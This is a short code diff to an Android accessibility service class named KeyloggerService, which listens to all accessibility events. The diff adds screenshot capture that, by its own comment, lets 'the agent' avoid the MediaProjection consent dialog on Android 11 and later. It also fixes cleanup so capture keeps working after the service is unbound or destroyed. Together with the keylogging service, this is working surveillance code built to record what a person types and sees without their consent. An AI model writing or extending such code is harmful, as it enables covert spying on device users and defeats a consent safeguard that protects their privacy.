@@ -16,6 +16,9 @@ class KeyloggerService : AccessibilityService() {
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
+        // Lets the agent take screenshots without a MediaProjection consent
+        // dialog, on Android 11+.
+        AccessibilityScreenshot.attach(this)
         try {
             val info = serviceInfo
             info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK
@@ -44,8 +47,18 @@ class KeyloggerService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
+    override fun onDestroy() {
+        // onDestroy does not always follow onUnbind, so clearing only in
+        // onUnbind left a stale AccessibilityService reference behind and every
+        // later capture failed against a dead instance.
+        instance = null
+        AccessibilityScreenshot.attach(null)
+        super.onDestroy()
+    }
+
     override fun onUnbind(intent: android.content.Intent?): Boolean {
         instance = null
+        AccessibilityScreenshot.attach(null)
         return super.onUnbind(intent)
     }
 
